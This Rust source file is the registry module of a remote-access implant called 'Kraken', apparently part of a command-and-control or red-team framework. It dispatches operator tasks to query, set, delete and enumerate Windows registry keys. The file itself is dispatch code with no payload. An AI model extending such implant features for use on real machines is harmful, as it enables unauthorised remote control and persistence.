//! mod-reg: Windows registry operations module for Kraken implant
//!
//! Provides registry query, set, delete, enum_keys, and enum_values capabilities.
//! This module is Windows-only; on other platforms all operations return an error.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{registry_task, RegistryTask};

mod ops;

pub struct RegModule {
    id: ModuleId,
}

impl RegModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("reg"),
        }
    }
}

impl Default for RegModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for RegModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Registry"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: RegistryTask = RegistryTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(registry_task::Operation::Query(query)) => {
                let result = ops::reg_query(&query)?;
                Ok(TaskResult::RegistryQuery(result))
            }
            Some(registry_task::Operation::Set(set)) => {
                let result = ops::reg_set(&set)?;
                Ok(TaskResult::RegistryOperation(result))
            }
            Some(registry_task::Operation::Delete(delete)) => {
                let result = ops::reg_delete(&delete)?;
                Ok(TaskResult::RegistryOperation(result))
            }
            Some(registry_task::Operation::EnumKeys(enum_keys)) => {
                let result = ops::reg_enum_keys(&enum_keys)?;
                Ok(TaskResult::RegistryEnumKeys(result))
            }
            Some(registry_task::Operation::EnumValues(enum_values)) => {
                let result = ops::reg_enum_values(&enum_values)?;
                Ok(TaskResult::RegistryEnumValues(result))
            }
            None => Err(KrakenError::Protocol("missing registry operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(RegModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = RegModule::new();
        assert_eq!(module.id().as_str(), "reg");
        assert_eq!(module.name(), "Registry");
    }
}
